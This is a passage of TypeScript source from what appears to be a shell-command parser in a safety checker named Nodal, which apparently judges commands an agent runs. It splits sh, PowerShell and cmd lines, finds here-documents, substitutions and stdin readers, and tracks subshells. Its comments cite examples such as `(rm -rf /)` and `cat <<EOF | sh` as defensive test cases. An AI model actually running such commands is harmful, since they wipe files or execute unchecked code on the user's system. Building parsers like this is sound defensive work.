    // moves it (#717, `RUNS_IN_PROCESS`).
    const runs = RUNS_IN_PROCESS[model].get(name);
    for (const payload of RUNS_ANOTHER[name]?.(args, shell) ?? []) {
      const read =
        'line' in payload
          ? commandUnits(payload.line, depth + 1, payload.shell, runs ? model : undefined)
          : wordUnits(payload.words, depth + 1, payload.shell, {
              invoked: payload.invoked === true,
              sourced: payload.sourced === true,
              ...(runs ? { model } : {}),
            });
      if (HANDS_WORDS.has(name)) for (const unit of read) FED_AT_RUN_TIME.add(unit);
      if (runs === undefined) runIn(read, [newProcess()]);
      else if (runs === 'not-known') {
        for (const unit of read) if (!UNIT_PROCESS.has(unit)) FOLDER_UNKNOWN.add(unit);
      } else if (runs === 'maybe') {
        // What it runs is a chain of its own: the `&&` after `if … cd x`
        // runs whether the cd did or not.
        for (const unit of read) MAY_NOT_RUN.add(unit);
        chainIn(read, [newProcess()]);
      }
      units.push(...read);
    }
    if (name === namedAfter) for (const unit of units.slice(from)) NAMED_AFTER_UNITS.add(unit);
  }
  return units;
}

/**
 * A command cut into its commands and each into words, quotes honoured and
 * removed: `python a.py "C:/My Files/x.csv"` is three words, not four.
 * Redirection targets are words too. Read as `shell` reads it (sh by default).
 */
export function splitShellWords(cmd: string, shell: LineShell = 'sh'): string[][] {
  return splitQuotedShellWords(cmd, shell).map((segment) => segment.map((w) => w.text));
}

/**
 * One word of a command: its text, whether it was written in quotes (cmd's
 * `start` title), and the raw text of the command from it on (what `cmd /c`
 * hands cmd to read again).
 */
interface ShellWord {
  text: string;
  quoted: boolean;
  tail?: string;
}

/**
 * The grammar of a shell that reads a line: what ends a command, what quotes,
 * what escapes (review of PR #682, pass 3). Unquoted `(` `)` `{` `}` are
 * operators where the shell has them: a command starts after an opening one,
 * glued or not (`(rm -rf /)`, `{ lpr x; }`, `ForEach-Object { Remove-Item $_ }`).
 */
interface Grammar {
  /** Characters that end a command outside quotes. */
  separators: string;
  /** Characters that open a quoted span. */
  quotes: string;
  /** The escape character outside quotes, if the shell has one. */
  escape: string | null;
  /** Inside double quotes: does `ch` escape the character after it? */
  escapesInDouble: (ch: string, next: string) => boolean;
  /** A quote written twice inside its span is that quote (`'it''s'`, `"say ""hi"""`). */
  doubledQuote: boolean;
}

/** sh: `\` escapes, single quotes are literal, `\` escapes only `"\$`` ` inside double quotes. */
const SH: Grammar = {
  separators: ';&|\n\r(){}',
  quotes: `"'`,
  escape: '\\',
  escapesInDouble: (ch, next) => ch === '\\' && '"\\$`'.includes(next),
  doubledQuote: false,
};

/** PowerShell: the backtick escapes, a quote is doubled inside its span, `&` calls a command. */
const POWERSHELL: Grammar = {
  separators: ';&|\n\r(){}',
  quotes: `"'`,
  escape: '`',
  escapesInDouble: (ch) => ch === '`',
  doubledQuote: true,
};

/**
 * `splitShellWords`, each word saying whether it was quoted, for the shell that
 * reads the line; the processes its commands run in are those of `processes`
 * (`COMMAND_PROCESS`).
 */
function splitQuotedShellWords(
  cmd: string,
  shell: LineShell,
  processes: LineShell = shell,
): ShellWord[][] {
  switch (shell) {
    case 'sh':
      return scanLine(cmd, SH, undefined, processes);
    case 'powershell':
      return scanLine(cmd, POWERSHELL, undefined, processes);
    case 'cmd':
      return cmdCommands(cmd);
    case 'exec':
      // A command line handed to a program, no shell: no operator, its words
      // by the Windows argument rules (`runas "prog args"`).
      return [windowsArguments(cmd)].filter((words) => words.length > 0);
  }
}

/**
 * A here-document as sh reads it: the operator (`<<EOF`, `<<-EOF`, `<<'EOF'`,
 * `<<"EOF"`, `<<\\EOF`), the program it feeds, and its body up to the end
 * marker. Only one that ends with its marker is one.
 */
export interface HereDocument {
  index: number;
  length: number;
  /** `<<-`: leading tabs are stripped from the body and the end marker. */
  strip: boolean;
  marker: string;
  /** A quoted marker: the body is taken as written, no substitution runs in it. */
  quotedMarker: boolean;
  /** Who reads the body (`stdinReceiver`): a shell, an interpreter, data, or not known. */
  receiver: StdinReceiver;
  /** Where the body starts and ends (the end marker's line excluded). */
  bodyStart: number;
  bodyEnd: number;
  /** Just past the end marker's line. */
  end: number;
}

const HERE_DOC_MARKER = /^<<(-?)[ \t]*(\\?)(["']?)([A-Za-z_][\w.-]*)\3/;

/**
 * Who reads what a command feeds on standard input (a here-document, a
 * here-string, a redirected file): a shell (its commands), an interpreter
 * (its source), a program that only reads data, or a program the reading
 * cannot place (#635, review pass 6 of PR #683).
 */
export interface StdinReceiver {
  kind: 'shell' | 'interpreter' | 'data' | 'doubt';
  /** The program, as `commandUnits` names it; null when there is none to name. */
  program: string | null;
}

/**
 * Programs that read their input as data and CANNOT run anything from it
 * (review pass 7 of #683): what a here-document fed to them holds is data
 * only when one of them reads it, and nothing it is piped to runs it. A
 * program with any way to execute what it reads is not one: sed (`e`,
 * `s///e`), awk (`system()`, `| getline`), perl, ruby, find, xargs, vi, ex,
 * ed, less, more (`!`), m4 (`syscmd`), make. Any other reader is judged.
 */
export const DATA_CONSUMERS: ReadonlySet<string> = new Set([
  'cat',
  'tee',
  'dd',
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'head',
  'tail',
  'wc',
  'sort',
  'uniq',
  'tr',
  'cut',
  'paste',
  'column',
  'fold',
  'fmt',
  'nl',
  'rev',
  'tac',
  'base64',
  'xxd',
  'od',
  'hexdump',
  'jq',
  'yq',
  'gzip',
  'gunzip',
  'bzip2',
  'bunzip2',
  'xz',
  'unxz',
  'zstd',
  'md5sum',
  'sha1sum',
  'sha256sum',
  'sha512sum',
  'cksum',
  'iconv',
  'dos2unix',
  'unix2dos',
  'diff',
  'cmp',
  'comm',
  'read',
  'mapfile',
  'readarray',
  'true',
  'set-content',
  'out-file',
  'add-content',
  'out-null',
]);

/** Interpreters that read a program on their standard input, besides `interpreterKind`'s. */
const STDIN_INTERPRETERS = new Set(['tsx', 'ts-node', 'deno', 'bun']);

/** The text after the first pipe of a line's tail (`|`, never `||`), outside quotes. */
function pipeTail(text: string): string | null {
  let quote: string | null = null;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i] ?? '';
    if (quote !== null) {
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") quote = ch;
    else if (ch === '\\') i++;
    else if (ch === '|' && text[i + 1] !== '|' && text[i - 1] !== '|') return text.slice(i + 1);
    else if (';&\n'.includes(ch)) return null;
  }
  return null;
}

/** What kind of reader one program is. */
function readerOf(program: string): StdinReceiver['kind'] | null {
  if (program === 'iex' || program === 'invoke-expression') return 'shell';
  if (SHELLS.includes(program) || POSIX_SHELLS.has(program)) return 'shell';
  const kind = interpreterKind(program);
  if (kind === 'shell' || kind === 'powershell') return 'shell';
  // An interpreter is a reader of source only in a language Nodal reads
  // (program-sources.ts); any other (`expect`) is a reader it cannot place,
  // whose body is judged as commands, never dropped (review pass 7 of #683).
  if ((kind !== null && READABLE_KINDS.has(kind)) || STDIN_INTERPRETERS.has(program))
    return 'interpreter';
  return null;
}

/** The interpreters whose language program-sources reads. */
const READABLE_KINDS: ReadonlySet<InterpreterKind> = new Set([
  'python',
  'node',
  'perl',
  'ruby',
  'php',
]);

/**
 * Who reads what a command feeds on its standard input, by the common reading
 * of its line (#635, review pass 6 of PR #683): `before` is the line up to the
 * operator, `after` the rest of it. The reader is the program the operator's
 * command runs once its wrappers are unwrapped (`sudo -u x sh`, `nohup bash`,
 * `timeout 5 sh`, `do bash` all feed sh), or, when it is piped on, a shell or
 * an interpreter the pipe reaches (`cat <<EOF | sh`). Data only when proven: a
 * known data reader, piped to nothing that runs anything.
 */
export function stdinReceiver(before: string, after: string): StdinReceiver {
  const doubt = (program: string | null): StdinReceiver => ({ kind: 'doubt', program });
  // A process substitution hands the input to a command the line does not name here.
  if (/[<>]\(/.test(before) || /[<>]\(/.test(after)) return doubt(null);
  const tail = pipeTail(after);
  const downstream = tail === null ? [] : commandUnits(tail, 0, 'sh');
  for (const unit of downstream) {
    const program = unit[0] ?? '';
    const kind = readerOf(program);
    if (kind !== null) return { kind, program };
  }
  const units = before.trim() === '' ? [] : commandUnits(before, 0, 'sh');
  // A literal piped on (`@"…"@ | x`): its reader is the first program of the pipe.
  const program = units[units.length - 1]?.[0] ?? downstream[0]?.[0] ?? '';
  if (program === '' || isDecidedAtRunTime(program)) return doubt(program || null);
  const kind = readerOf(program);
  if (kind !== null) return { kind, program };
  const piped = downstream.map((u) => u[0] ?? '');
  if (DATA_CONSUMERS.has(program) && piped.every((p) => DATA_CONSUMERS.has(p)))
    return { kind: 'data', program };
  return doubt(program);
}

/**
 * The units that stand for text no reading follows (`unfollowed`): nobody
 * knows what they run. Marked by identity, never by text (Nodal review of PR
 * #721, pass 16): no line can write one, and a line that writes their text
 * (`$(…)`) is the program decided at run time it always was. To the
 * checklist they are such a program; to the floor a destroyer not known
 * (`isCatastrophicCommand`), refused under any autonomy.
 */
const UNFOLLOWED_UNITS = new WeakSet<readonly string[]>();

/** A unit for text no reading follows (`UNFOLLOWED_UNITS`). */
function unfollowed(): string[] {
  const unit = ['$(…)'];
  UNFOLLOWED_UNITS.add(unit);
  return unit;
}

/** True when `unit` stands for text no reading follows (`unfollowed`). */
export function isUnfollowedUnit(unit: readonly string[]): boolean {
  return UNFOLLOWED_UNITS.has(unit);
}

/**
 * How deep payloads and substitutions are followed (`commandUnits`,
 * `wordUnits`, every recursion of a line's reading): past it, `unfollowed`.
 */
const MAX_DEPTH = 8;

/**
 * How deep a line's parentheses and braces nest before the reading stops
 * following (`withinNesting`): what nests deeper is not read (passes 14, 15).
 * Within it, no reader below recurses past this depth.
 */
const MAX_NESTING = 32;

/**
 * A line with what its parentheses and braces nest past `MAX_NESTING` taken
 * out (quotes ignored: never less than any reading nests), and whether any
 * was: the rest stays, to be read as any line (pass 15).
 */
function withinNesting(text: string): { text: string; cut: boolean } {
  let depth = 0;
  let kept = '';
  let cut = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i] ?? '';
    if ((c === '(' || c === '{') && depth === MAX_NESTING) {
      // Past the limit: up to the parenthesis or brace that closes this one.
      let level = 0;
      let j = i;
      for (; j < text.length; j++) {
        const d = text[j];
        if (d === '(' || d === '{') level += 1;
        else if ((d === ')' || d === '}') && --level === 0) break;
      }
      kept += ' ';
      cut = true;
      i = j;
      continue;
    }
    if (c === '(' || c === '{') depth += 1;
    else if ((c === ')' || c === '}') && depth > 0) depth -= 1;
    kept += c;
  }
  return { text: kept, cut };
}

/**
 * The command substitutions of a text, outermost ones: the code of each
 * `$( … )` (and of each backtick span in sh), read wherever it stands, in
 * double quotes, in a case pattern, even in single quotes (a safety net may
 * over-read: `echo '$(…)' | sh` runs it). Each ends where its `(` balances
 * (`closingParen`). An arithmetic `$(( … ))` is no code; the substitutions in
 * it are.
 *
 * Nothing is ever dropped (Nodal review of PR #721, pass 14): a substitution
 * whose end is not found is read to the end of the text, as code.
 */
function substitutionsOf(text: string, shell: 'sh' | 'powershell'): string[] {
  const escape = shell === 'sh' ? '\\' : '`';
  const found: string[] = [];
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (c === escape) i += 1;
    else if (c === '$' && text[i + 1] === '(') {
      const end = closingParen(text, i + 1, shell);
      if (end === null) return [...found, text.slice(i + 2)];
      if (text[i + 2] === '(' && text[end - 1] === ')')
        found.push(...substitutionsOf(text.slice(i + 3, end - 1), shell));
      else found.push(text.slice(i + 2, end));
      i = end;
    } else if (shell === 'sh' && c === '`') {
      const end = closingBacktick(text, i);
      if (end === null) return [...found, text.slice(i + 1)];
      found.push(text.slice(i + 1, end));
      i = end;
    }
  }
  return found;
}

/** The backtick that closes the one at `at`, past escaped ones; null if none. */
function closingBacktick(text: string, at: number): number | null {
  for (let j = at + 1; j < text.length; j++) {
    if (text[j] === '\\') j += 1;
    else if (text[j] === '`') return j;
  }
  return null;
}

/**
 * The `)` that balances the `(` at `open`, as `shell` reads the code between
 * (Nodal review of PR #721, passes 13 and 14): quotes and escapes, sh's
 * `$'…'` with its escapes, a nested `$( … )` read whole in double quotes,
 * `${ … }` and `$[ … ]` (whose `)` close nothing), backtick spans, comments
 * (sh's `#` starting a word, PowerShell's `#` and `<# … #>`), and a `case`'s
 * patterns. `case` and `esac` are reserved where a command starts only, as
 * the scan reads them (`shNextCommand`), and a pattern is read by the scan's
 * pattern reader (`casePatternEnd`). Null when it never balances.
 */
function closingParen(text: string, open: number, shell: 'sh' | 'powershell'): number | null {
  const escape = shell === 'sh' ? '\\' : '`';
  const startsWord = (at: number): boolean => /^$|[\s;&|()]/.test(text[at - 1] ?? '');
  let depth = 0;
  // The cases open: the depth each stands at, and whether a pattern comes next.
  const cases: Array<{ depth: number; in: boolean; pattern: boolean }> = [];
  // Whether a command may start here (`case`, `esac` are reserved there only).
  let command = true;
  let double = false;
  for (let j = open; j < text.length; j++) {
    const c = text[j] ?? '';
    const next = text[j + 1] ?? '';
    const top = cases[cases.length - 1];
    if (c === escape) {
      j += 1;
      continue;
    }
    if (double) {
      if (c === '"') double = false;
      else if (c === '$' && (next === '(' || next === '{' || next === '[')) {
        const end = skipExpansion(text, j, shell);
        if (end === null) return null;
        j = end;
      } else if (shell === 'sh' && c === '`') {
        const end = closingBacktick(text, j);
        if (end === null) return null;
        j = end;
      }
      continue;
    }
    if (shell === 'sh' && top?.pattern === true && command && !/[\s;&|)]/.test(c)) {
      // Where a pattern is expected, `esac` closes the case; anything else is
      // a pattern, read to its `)` as the scan reads it.
      if (/^esac(?![^\s;&|()<>])/.test(text.slice(j))) {
        cases.pop();
        j += 3;
        command = false;
        continue;
      }
      const end = casePatternEnd(text, j);
      if (typeof end !== 'number') return null;
      top.pattern = false;
      j = end;
      command = true;
      continue;
    }
    if (c === '"') double = true;
    else if (c === "'") {
      const end = text.indexOf("'", j + 1);
      if (end < 0) return null;
      j = end;
      command = false;
    } else if (shell === 'sh' && c === '`') {
      const end = closingBacktick(text, j);
      if (end === null) return null;
      j = end;
      command = false;
    } else if (shell === 'sh' && c === '$' && next === "'") {
      j = ansiQuoteEnd(text, j);
      command = false;
    } else if (c === '$' && (next === '{' || next === '[' || (next === '(' && shell === 'sh'))) {
      const end = skipExpansion(text, j, shell);
      if (end === null) return null;
      j = end;
      command = false;
    } else if (startsWord(j) && c === '#') {
      // A comment, to the end of its line, which ends the command.
      const end = text.indexOf('\n', j);
      if (end < 0) return null;
      j = end - 1;
    } else if (shell === 'powershell' && c === '<' && next === '#') {
      const end = text.indexOf('#>', j + 2);
      if (end < 0) return null;
      j = end + 1;
    } else if (c === '(') {
      depth += 1;
      command = true;
    } else if (c === ')') {
      depth -= 1;
      if (depth === 0) return j;
      command = false;
    } else if (c === ';' || c === '&' || c === '|' || c === '\n' || c === '{' || c === '}') {
      // `;;`, `;&`, `;;&` end a clause: a pattern comes next.
      if (c === ';' && (next === ';' || next === '&') && top !== undefined && top.depth === depth)
        top.pattern = true;
      command = true;
    } else if (!/\s/.test(c)) {
      // A word: reserved where a command starts, as the scan reads it.
      const word = /^[^\s;&|()<>'"`$\\]+/.exec(text.slice(j))?.[0] ?? c;
      if (shell === 'sh' && command && word === 'case')
        cases.push({ depth, in: false, pattern: false });
      else if (shell === 'sh' && top !== undefined && !top.in && word === 'in') {
        top.in = true;
        top.pattern = true;
        command = true;
        j += word.length - 1;
        continue;
      }
      command = command && shNextCommand((k) => (k === 0 ? word : ''), 0) !== null;
      j += word.length - 1;
    }
  }
  return null;
}

/**
 * Where an expansion that starts with `$` at `at` ends: `$( … )` at its
 * balancing `)` (`closingParen`), `${ … }` at the `}` that closes it, `$[ … ]`
 * at its `]`, past quotes and escapes; null when it never ends.
 */
function skipExpansion(text: string, at: number, shell: 'sh' | 'powershell'): number | null {
  const open = text[at + 1];
  if (open === '(') return closingParen(text, at + 1, shell);
  const close = open === '{' ? '}' : ']';
  const escape = shell === 'sh' ? '\\' : '`';
  let depth = 0;
  for (let j = at + 1; j < text.length; j++) {
    const c = text[j];
    if (c === escape) j += 1;
    else if (c === "'" || c === '"') {
      const end = text.indexOf(c, j + 1);
      if (end < 0) return null;
      j = end;
    } else if (c === open) depth += 1;
    else if (c === close) {
      depth -= 1;
      if (depth === 0) return j;
    }
  }
  return null;
}

/** Where sh's `$'…'` that starts at `at` ends: its `'`, past backslash escapes (`\'`). */
function ansiQuoteEnd(text: string, at: number): number {
  for (let j = at + 2; j < text.length; j++) {
    if (text[j] === '\\') j += 1;
    else if (text[j] === "'") return j;
  }
  return text.length - 1;
}

/**
 * The here-documents of a text, as sh reads it (#635, reviews 4 and 5 of PR
 * #683): the same scan as its commands, so a `<<` in quotes, in a comment, in
 * arithmetic (`$(( ))`, `(( ))`, `let`) or in `[[ ]]` opens none, and a body
 * is data to the scan: a quote or a `$((` in it changes nothing after it.
 */
export function hereDocuments(text: string): HereDocument[] {
  const found: HereDocument[] = [];
  scanLine(text, SH, found);
  return found;
}

/** `text` with the body and end marker of each here-document blanked, lines kept. */
function withoutHereDocBodies(text: string): string {
  if (!text.includes('<<')) return text;
  let out = text;
  for (const doc of hereDocuments(text))
    out =
      out.slice(0, doc.bodyStart) +
      out.slice(doc.bodyStart, doc.end).replace(/[^\n]/g, ' ') +
      out.slice(doc.end);
  return out;
}

/** Where a here-document's body ends: the end marker's line, from `from`; null when it never comes. */
function bodyEnd(
  text: string,
  from: number,
  strip: boolean,
  marker: string,
): { bodyEnd: number; end: number } | null {
  let at = from;
  while (at <= text.length) {
    const nl = text.indexOf('\n', at);
    const lineEnd = nl < 0 ? text.length : nl;
    let l = text.slice(at, lineEnd).replace(/\r$/, '');
    if (strip) l = l.replace(/^\t+/, '');
    if (l === marker)
      return { bodyEnd: Math.max(from, at - 1), end: nl < 0 ? text.length : nl + 1 };
    if (nl < 0) return null;
    at = nl + 1;
  }
  return null;
}

/**
 * The child processes a scanned command runs in, below the line's own process,
 * outermost first (#717): `UNIT_PROCESS` for the units read from it.
 */
const COMMAND_PROCESS = new WeakMap<readonly ShellWord[], readonly number[]>();

/** The scanned commands that may not run whenever the line reaches them: `MAY_NOT_RUN`. */
const COMMAND_MAY_NOT_RUN = new WeakSet<readonly ShellWord[]>();

/** The `&&` chains a scanned command is in, outermost first: `UNIT_CHAIN`. */
const COMMAND_CHAIN = new WeakMap<readonly ShellWord[], readonly number[]>();

/** The scanned commands on the right of a PowerShell pipe: `FED_AT_RUN_TIME`. */
const COMMAND_PIPED = new WeakSet<readonly ShellWord[]>();

/** sh's compound commands: what opens one, where its body starts, what closes it. */
const SH_OPENS = new Set(['if', 'while', 'until', 'for', 'select', 'case']);
const SH_BODY = new Set(['then', 'else', 'elif', 'do']);
const SH_CLOSES = new Set(['fi', 'done', 'esac']);
/** The compounds whose first word a command follows: their condition. */
const SH_CONDITIONS = new Set(['if', 'while', 'until']);

/**
 * Where the next word in command position is, past the reserved word at `i`
 * that leaves one after it (Nodal review of PR #721, passes 10 to 12): `then`,
 * `else`, `elif`, `do`, `!`, `if`, `while`, `until`, `time` and its options,
 * `coproc` and its name before a compound; null for any other word.
 * `reserved(i)`: the word at `i` when sh may read it as reserved, else ''.
 */
function shNextCommand(reserved: (i: number) => string, i: number): number | null {
  const word = reserved(i);
  if (SH_BODY.has(word) || SH_CONDITIONS.has(word) || word === '!') return i + 1;
  if (word === 'time') {
    let next = i + 1;
    while (/^-/.test(reserved(next))) next++;
    return next;
  }
  if (word === 'coproc')
    return !SH_OPENS.has(reserved(i + 1)) && SH_OPENS.has(reserved(i + 2)) ? i + 2 : i + 1;
  return null;
}

/** The PowerShell commands that run the block they are given once, in the runspace. */
const PS_RUNS_BLOCK_ONCE = new Set(['&', '.', 'try', 'finally', 'invoke-command', 'icm']);

/**
 * Which commands of a line its shell runs in a process of their own (#717),
 * told operator by operator by the scanner that cuts the line, read with the
 * process model of the shell that runs it:
 * - sh: a `( … )` subshell, `$( … )` and `<( … )`, each side of a pipe, and
 *   a list sent to the background with `&`; `{ …; }` runs in its process;
 * - cmd: each side of a pipe; its `( … )` blocks run in its process, after an
 *   `if`, a `for`, an `else` or where a command starts; elsewhere a
 *   parenthesis, like `$(` and a brace, is text, where nothing runs;
 * - PowerShell: a pipeline sent to the background with a final `&`, and the
 *   script block of a command that runs it in another runspace or process
 *   (`runsBlockApart`); pipes, `( … )`, `$( … )` and any other `{ … }` run in
 *   its own runspace.
 *
 * And which may not run whenever the line reaches them (Nodal review of PR
 * #721, P1): a command on the right of `&&` or `||` (the head of a list runs);
 * in sh, the body of an `if`, a loop or a `case`, and a function's; in cmd, the
 * block of an `if`, an `else` or a `for`; in PowerShell, any script block but
 * the one `&`, `.`, `try`, `finally` or `Invoke-Command` runs once (`if`, loops,
 * `ForEach-Object`, `catch`, a function, a block left as a value).
 */
class Processes {
  /**
   * The groups open: each a child process or not, whether its commands may not
   * run, the list it is part of, and whether it is a parenthesis after a word.
   */
  private readonly groups: Array<{
    process: number | null;
    mayNotRun: boolean;
    start: number;
    list: number;
    orElse: boolean;
    afterWord: boolean;
    /** The chain the group is an element of, and the one the scan goes on in after it. */
    chain: number;
    then: number;
  }> = [];
  /** Where the last whole command (simple, or a group) starts: what a pipe takes. */
  private last = -1;
  /** Where the current list (`a && b || c`) starts: what `&` sends to the background. */
  private list = 0;
  /** The process of the command that comes next: a pipe's right side. */
  private side: number | null = null;
  /** The command that comes next is bound what a PowerShell pipeline hands it (#715). */
  private piped = false;
  /** Past the head of the current list: after `&&` or `||`. */
  private orElse = false;
  /**
   * sh's compound commands open: whether the scan is in their body, where
   * each starts, and for a case whether a pattern comes next.
   */
  private readonly compounds: Array<{ body: boolean; start: number; pattern?: boolean }> = [];
  /**
   * Where the group that just closed starts, while nothing follows it but its
   * redirections (`( … ) > f`): they are its commands' (Nodal review of PR
   * #721, pass 9).
   */
  private closed: number | null = null;
  /** sh: `name()` was just written, and the brace that follows is a function's body. */
  private functionNext = false;
  /**
   * The `&&` chain the next command joins (Nodal review of PR #721): what
   * follows a command through `&&` alone runs only if it ran. `;`, a new
   * line, `&` and `||` end it; the command right after `||` is in none, for
   * it is skipped exactly when what came before succeeded, and the `&&` after
   * it then runs anyway.
   */
  private chain = newProcess();
  /** The next command, right after `||`, joins no chain of the list. */
  private alone = false;

  constructor(
    private readonly model: LineShell,
    private readonly commands: ShellWord[][],
  ) {}

  /** The child processes open where the scan is. */
  here(): number[] {
    return this.groups.flatMap((g) => (g.process === null ? [] : [g.process]));
  }

  /** The chain the next element of the list joins: its own one, right after `||`. */
  private joinChain(): number {
    if (!this.alone) return this.chain;
    this.alone = false;
    const own = newProcess();
    this.chain = newProcess();
    return own;
  }

  /** True when what the scan meets now may not run whenever the line reaches it. */
  private mayNotRun(): boolean {
    return (
      this.orElse || this.groups.some((g) => g.mayNotRun) || this.compounds.some((c) => c.body)
    );
  }

  /** The scanner pushed a command. */
  command(): void {
    const at = this.commands.length - 1;
    const words = this.commands[at];
    if (words === undefined) return;
    COMMAND_PROCESS.set(words, [...this.here(), ...(this.side === null ? [] : [this.side])]);
    COMMAND_CHAIN.set(words, [...this.groups.map((g) => g.chain), this.joinChain()]);
    if (this.piped) COMMAND_PIPED.add(words);
    this.piped = false;
    this.side = null;
    this.last = at;
    this.closed = null;
    this.functionNext = false;
    // sh's reserved words count wherever a command may start, as its grammar
    // reads them (Nodal review of PR #721, pass 10): at the segment's start,
    // and after `then`, `else`, `elif`, `do`, `!`, `if`, `while` and `until`,
    // which a command follows (`do if …`, `else for …`, `if ! curl …`), and
    // after `time` and its options and `coproc` and its name (pass 11). A
    // word quoted or escaped in any part is none (`"done"`, `\done`).
    const reserved = (i: number): string =>
      this.model === 'sh' && words[i]?.quoted === false ? (words[i]?.text ?? '') : '';
    let i = 0;
    for (; SH_BODY.has(reserved(i)); i++) {
      const open = this.compounds[this.compounds.length - 1];
      if (open !== undefined) open.body = true;
    }
    if (this.mayNotRun()) COMMAND_MAY_NOT_RUN.add(words);
    // `case … in` is followed by its body at once. The compound that closes
    // is the whole command (`for … done | x`, `if … fi > f`).
    while (i < words.length) {
      const word = reserved(i);
      if (SH_OPENS.has(word))
        this.compounds.push({ body: word === 'case', start: at, pattern: word === 'case' });
      else if (SH_CLOSES.has(word)) {
        this.last = this.compounds.pop()?.start ?? at;
        break;
      }
      const next = shNextCommand(reserved, i);
      if (next === null) break;
      i = next;
    }
  }

  /** True when the case the scan is in expects a pattern next. */
  expectsPattern(): boolean {
    return this.compounds[this.compounds.length - 1]?.pattern === true;
  }

  /** The case's pattern was read: its commands come next. */
  patternRead(): void {
    const open = this.compounds[this.compounds.length - 1];
    if (open !== undefined) open.pattern = false;
  }

  /** `;;`, `;&`, `;;&`: the case's next clause starts with a pattern. */
  patternNext(): void {
    const open = this.compounds[this.compounds.length - 1];
    if (open?.pattern === false) open.pattern = true;
  }

  /**
   * The redirections of the command the scanner just pushed: of the whole
   * compound when it closes one (`if … fi > f`, `for … done > f`, measured
   * in bash). Every command they cover shares them: the shell opens each
   * once, before running the first.
   */
  redirectCommand(redirections: readonly Redirection[]): void {
    this.cover(this.last, redirections);
  }

  /**
   * Redirections written where no command stands: after a group that just
   * closed (`( … ) > f`, `{ …; } > f`, cmd's `( … ) > f`, PowerShell's
   * `( … ) > f`, measured), they are its commands', nested groups included.
   * Alone (`> f`), they run nothing: bash creates an empty file, cmd refuses
   * the line (measured). No download lands there.
   */
  redirectGroup(redirections: readonly Redirection[]): void {
    if (this.closed !== null) this.cover(this.closed, redirections);
  }

  private cover(from: number, redirections: readonly Redirection[]): void {
    if (from < 0 || redirections.length === 0) return;
    for (let i = from; i < this.commands.length; i++) {
      const words = this.commands[i];
      if (words !== undefined)
        COMMAND_REDIRECTIONS.set(words, [
          ...(COMMAND_REDIRECTIONS.get(words) ?? []),
          ...redirections,
        ]);
    }
  }

  /**
   * An opening `(` or `{`. `kind`: `$(`, `@(`, `<(`, `>(` are substitutions;
   * a `(` is at a command's start or after a word. `command`: the words of the
   * command written before it, as written.
   */
  open(kind: 'substitution' | 'start' | 'after-word' | 'brace', command: readonly string[]): void {
    const head = (command[0] ?? '').toLowerCase();
    let child: boolean;
    let mayNotRun: boolean;
    switch (this.model) {
      case 'sh':
        child = kind === 'substitution' || kind === 'start';
        mayNotRun = kind === 'brace' && (this.functionNext || head === 'function');
        break;
      case 'cmd': {
        const block = ['if', 'for', 'else', 'do'].includes(head);
        child = kind === 'substitution' || kind === 'brace' || (kind === 'after-word' && !block);
        mayNotRun = kind === 'after-word' && block;
        break;
      }
      case 'powershell':
        child = kind === 'brace' && runsBlockApart(command);
        mayNotRun =
          kind === 'brace' &&
          !PS_RUNS_BLOCK_ONCE.has((afterAssignment(command)[0] ?? '').toLowerCase());
        break;
      default:
        child = false;
        mayNotRun = false;
    }
    const process = this.side ?? (child ? newProcess() : null);
    this.side = null;
    this.piped = false;
    const chain = this.joinChain();
    this.groups.push({
      process,
      mayNotRun: mayNotRun || this.mayNotRun(),
      start: this.commands.length,
      list: this.list,
      orElse: this.orElse,
      afterWord: kind === 'after-word',
      chain,
      then: this.chain,
    });
    this.list = this.commands.length;
    this.orElse = false;
    this.functionNext = false;
    this.chain = newProcess();
    this.closed = null;
  }

  /** A closing `)` or `}`: the group is one command of the list around it. */
  close(): void {
    const group = this.groups.pop();
    if (group === undefined) return;
    this.last = group.start;
    this.closed = group.start;
    this.list = group.list;
    this.orElse = group.orElse;
    this.chain = group.then;
    // `name()`: an empty parenthesis after a word names a function.
    this.functionNext =
      this.model === 'sh' && group.afterWord && group.start === this.commands.length;
  }

  /**
   * A pipe: each side is a process of its own, but in PowerShell, where what
   * it hands the right side is bound to that command's parameters (#715). In
   * sh and cmd it is the program's input, never its arguments.
   */
  pipe(): void {
    this.closed = null;
    if (this.model === 'powershell') {
      this.piped = true;
      return;
    }
    this.apart(this.last);
    this.side = newProcess();
  }

  /** `&&` or `||`: what follows in the list runs only on the result of what came before. */
  andOr(operator: '&&' | '||'): void {
    this.closed = null;
    this.piped = false;
    this.orElse = true;
    if (operator === '||') {
      this.chain = newProcess();
      this.alone = true;
    }
  }

  /** `&` alone: what it ends is sent to the background, in sh and PowerShell (`rest`, after it). */
  ampersand(rest: string): void {
    const background =
      this.model === 'sh' || (this.model === 'powershell' && /^[ \t]*($|[;\r\n)}])/.test(rest));
    if (background) this.apart(this.list);
    this.next();
  }

  /** `;` or a new line: a new list starts. */
  next(): void {
    this.closed = null;
    this.piped = false;
    this.list = this.commands.length;
    this.orElse = false;
    this.chain = newProcess();
    this.alone = false;
  }

  /** The commands from `from` on run in one process of their own. */
  private apart(from: number): void {
    if (from < 0) return;
    const depth = this.here().length;
    const process = newProcess();
    for (let i = from; i < this.commands.length; i++) {
      const words = this.commands[i];
      if (words === undefined) continue;
      const path = COMMAND_PROCESS.get(words) ?? [];
      COMMAND_PROCESS.set(words, [...path.slice(0, depth), process, ...path.slice(depth)]);
    }
  }
}

/** A PowerShell command's words past an assignment of its result (`$j = Start-Job`). */
function afterAssignment(command: readonly string[]): string[] {
  const glued = /^\$[\w:]+=(.+)$/.exec(command[0] ?? '');
  if (glued) return [glued[1] ?? '', ...command.slice(1)];
  if ((command[0] ?? '').startsWith('$') && command[1] === '=') return command.slice(2);
  return [...command];
}

/**
 * True when a PowerShell command runs the script block it is given in another
 * runspace or process, where a location it sets is not the line's (#717):
 * `Start-Job` (`sajb`) and `Start-ThreadJob`, `ForEach-Object` with `-Parallel` or
 * `-UseNewRunspace` (`%`, `foreach`), and `Invoke-Command` (`icm`) on a computer, a
 * session, a VM, a container, an SSH host, or as a job; a plain
 * `ForEach-Object` or `Invoke-Command` runs it in the caller's runspace.
 * `command`: its words before the block.
 */
function runsBlockApart(command: readonly string[]): boolean {
  const [head = '', ...args] = afterAssignment(command);
  const bindsOne = (sig: PsSignature, names: readonly string[]): boolean =>
